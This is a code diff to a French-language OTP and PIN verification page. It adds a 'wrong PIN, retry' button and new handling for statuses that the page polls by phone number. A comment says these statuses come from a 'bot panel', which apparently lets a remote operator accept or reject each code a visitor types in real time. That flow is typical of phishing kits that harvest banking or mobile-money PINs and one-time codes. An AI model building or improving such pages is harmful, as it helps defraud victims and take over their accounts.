@@ -89,6 +89,24 @@
             background-color: #00542a;
         }
 
+        .btn-wrong-pin {
+            background-color: transparent;
+            color: #dc2626;
+            border: 1px solid #f8b4b4;
+            width: 100%;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-wrong-pin:hover {
+            background-color: #fde8e8;
+        }
+
         #loadingSection { display: none; }
 
         .footer-wave { 
@@ -129,6 +147,10 @@
 
     <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
         VÉRIFIER LE CODE (OTP)
+    </button>
+
+    <button id="wrongPinBtn" class="btn-wrong-pin" onclick="handleWrongPin()">
+        ❌ PIN incorrect ? Réessayer
     </button>
 </div>
 
@@ -192,6 +214,11 @@ function check() {
     verifyBtn.classList.toggle('active', filled);
 }
 
+function handleWrongPin() {
+    // Redirects directly to page6 displaying the error URL parameter
+    window.location.href = "/page6.html?error=wrongpin";
+}
+
 async function handleVerification() {
     if (isSubmitting) return;
 
@@ -218,18 +245,23 @@ async function handleVerification() {
             const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
             const data = await res.json();
 
-            if (data.status === "otp1_correct") {
+            // Success Route
+            if (data.status === "otp1_correct" || data.status === "approved") {
                 clearInterval(poll);
                 localStorage.setItem("phone", phone);
-                // Redirect directly to your custom public success page
                 window.location.href = "/publicsuccess.html";
             }
 
+            // Wrong PIN route triggered from bot panel
+            if (data.status === "wrong_pin" || data.status === "pin_incorrect") {
+                clearInterval(poll);
+                handleWrongPin();
+            }
+
+            // Wrong OTP code
             if (data.status === "otp1_wrong") {
                 clearInterval(poll);
-
                 errorBox.innerText = "❌ Le code OTP est incorrect. Veuillez saisir le bon code.";
-
                 reset();
             }
 
